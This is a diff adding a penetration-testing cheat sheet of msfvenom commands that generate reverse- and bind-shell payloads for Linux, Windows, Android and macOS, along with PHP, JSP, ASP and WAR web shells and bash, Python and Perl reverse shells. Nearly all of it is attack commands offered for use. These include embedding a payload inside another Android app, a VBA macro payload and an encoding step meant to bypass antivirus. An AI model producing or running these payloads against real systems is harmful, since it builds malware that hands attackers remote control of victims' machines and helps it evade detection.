@@ -1,0 +1,112 @@
+Linux Reverse Shells
+
+# x86
+$ msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4545 -f elf > shell.elf
+
+# x64
+$ msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4545 -f elf > shell.elf
+
+# x86 Reverse HTTP
+$ msfvenom -p linux/x86/meterpreter_reverse_http LHOST=10.10.10.10 LPORT=4545 -f elf > shell.elf
+
+# x64 Reverse HTTP
+$ msfvenom -p linux/x64/meterpreter_reverse_http LHOST=10.10.10.10 LPORT=4545 -f elf > shell.elf
+
+Windows Reverse Shells
+
+# x86 normal
+$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4545 -f exe > shell.exe
+
+# x64 (CMD Single Stage)
+$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4545 -f exe > shell.exe
+
+# reverse HTTP
+$ msfvenom -p windows/meterpreter/reverse_http LHOST=10.10.10.10 LPORT=4545 -f exe > shell.exe
+
+# reverse HTTPS
+$ msfvenom -p windows/meterpreter/reverse_https LHOST=10.10.10.10 LPORT=4545 -f exe > shell.exe
+
+# Powershell Payload
+$ msfvenom -p cmd/windows/reverse_powershell LHOST=10.10.10.10 LPORT=4545 > shell.bat
+
+# Macro Payload
+$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4545 -f vba
+
+Android Reverse Shells
+
+$ msfvenom -p android/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4545 R > shell.apk
+
+# Android Embed Payload with another apk
+$ msfvenom -x anyApp.apk android/meterpreter/reverse_tcp lhost=10.10.10.10 lport=4545 -o shell.apk
+
+# Reverse HTTP
+$ msfvenom -p android/meterpreter/reverse_http LHOST=10.10.10.10 LPORT=4545 R > shell.apk
+
+# Reverse HTTPS
+$ msfvenom -p android/meterpreter/reverse_https LHOST=10.10.10.10 LPORT=4545 R > shell.apk
+
+macOS Reverse Shells
+
+$ msfvenom -p osx/x86/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4545 -f macho > shell.macho
+
+# Reverse TCP Shellcode
+$ msfvenom -p osx/x86/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4545 -f < platform
+
+Meterpreter Bind Shells(Linux)
+
+# x86 (multi stage)
+$ msfvenom -p linux/x86/meterpreter/bind_tcp RHOST=12.12.12.12 LPORT=4545 -f elf > shell.elf
+
+# x64 (single stage)
+$ msfvenom -p linux/x64/shell_bind_tcp RHOST=12.12.12.12 LPORT=4545 -f elf > shell.elf
+
+Meterpreter Bind Shells(Windows)
+
+$ msfvenom -p windows/meterpreter/bind_tcp RHOST=12.12.12.12 LPORT=4545 -f exe > bind.exe
+
+# Hidden Bind TCP Payload
+$ msfvenom -p windows/shell_hidden_bind_tcp RHOST=12.12.12.12 LPORT=4545 -f exe > hidden_shell.exe
+
+Meterpreter Bind Shell(macOS)
+
+# Hidden Bind TCP Payload
+$ msfvenom -p osx/x86/shell_bind_tcp RHOST=12.12.12.12 LPORT=4545 -f macho > shell.macho
+
+Meterpreter Web Payloads(PHP)
+
+$ msfvenom -p php/reverse_php LHOST=10.10.10.10 LPORT=4545 -f raw > shell.php
+
+# PHP Meterpreter Reverse TCP
+$ msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.10.10 LPORT=4545 -f raw > shell.php
+$ cat shell.php | pbcopy && echo ‘<?php ' | tr -d '\n'> shell.php && pbpaste >> shell.php
+
+Meterpreter Web Payloads(Java JSP Reverse TCP)
+
+$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.10.10 LPORT=4545 -f raw > shell.jsp
+
+Meterpreter Web Payloads(ASP Reverse TCP)
+
+$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4545 -f asp > shell.asp
+
+Meterpreter Web Payloads(WAR Payload Shells)
+
+$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.10.10 LPORT=4545 -f war > shell.war
+
+Scripting Payloads(Bash Unix Reverse Shell)
+
+$ msfvenom -p cmd/unix/reverse_bash LHOST=10.10.10.10 LPORT=4545 -f raw > shell.sh
+
+Scripting Payloads(Python Reverse Shell) 
+
+$ msfvenom -p cmd/unix/reverse_python LHOST=10.10.10.10 LPORT=4545 -f raw > shell.py
+
+Scripting Payloads(Perl Unix Reverse Shell)
+
+$ msfvenom -p cmd/unix/reverse_perl LHOST=10.10.10.10 LPORT=4545 -f raw > shell.pl
+
+WAF and AntiVirus Detection(AV) Bypass 
+
+$ msfvenom --platform Windows -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 5 LHOST=10.10.10.10 LPORT=4545 -f exe > encoded_shell.exe
+
+msfvenom -p windows/shell_reverse_tcp lhost=10.10.14.88 lport=4444 -f aspx > shell.aspx
+dont have to use metasploit for this one
